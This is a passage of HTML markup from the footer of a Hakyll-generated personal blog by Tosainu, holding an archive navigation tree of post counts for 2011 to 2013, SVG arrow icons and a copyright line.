24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2013/">2013 (116)</a></label><ul class="tree-child"><li><a href="/entry/2013/12/">2013/12 (8)</a></li><li><a href="/entry/2013/11/">2013/11 (6)</a></li><li><a href="/entry/2013/10/">2013/10 (5)</a></li><li><a href="/entry/2013/09/">2013/09 (5)</a></li><li><a href="/entry/2013/08/">2013/08 (4)</a></li><li><a href="/entry/2013/07/">2013/07 (3)</a></li><li><a href="/entry/2013/06/">2013/06 (12)</a></li><li><a href="/entry/2013/05/">2013/05 (16)</a></li><li><a href="/entry/2013/04/">2013/04 (16)</a></li><li><a href="/entry/2013/03/">2013/03 (27)</a></li><li><a href="/entry/2013/02/">2013/02 (7)</a></li><li><a href="/entry/2013/01/">2013/01 (7)</a></li></ul></li><li><input id="tree-label-2012" type="checkbox" class="tree-toggle"><label for="tree-label-2012" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2012/">2012 (11)</a></label><ul class="tree-child"><li><a href="/entry/2012/12/">2012/12 (3)</a></li><li><a href="/entry/2012/09/">2012/09 (1)</a></li><li><a href="/entry/2012/07/">2012/07 (4)</a></li><li><a href="/entry/2012/04/">2012/04 (1)</a></li><li><a href="/entry/2012/03/">2012/03 (1)</a></li><li><a href="/entry/2012/01/">2012/01 (1)</a></li></ul></li><li><input id="tree-label-2011" type="checkbox" class="tree-toggle"><label for="tree-label-2011" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2011/">2011 (12)</a></label><ul class="tree-child"><li><a href="/entry/2011/09/">2011/09 (1)</a></li><li><a href="/entry/2011/06/">2011/06 (1)</a></li><li><a href="/entry/2011/05/">2011/05 (1)</a></li><li><a href="/entry/2011/03/">2011/03 (6)</a></li><li><a href="/entry/2011/02/">2011/02 (1)</a></li><li><a href="/entry/2011/01/">2011/01 (2)</a></li></ul></li></ul></section></div></div><div class="footer-bottom"><div class="container"><div class="copyright">© 2011-2018 Tosainu. Site generated by <a href="https://jaspervdj.be/hakyll/" target="_blank" rel="nofollow noopener">Hakyll</a>.</div></div></div></footer></body></html>
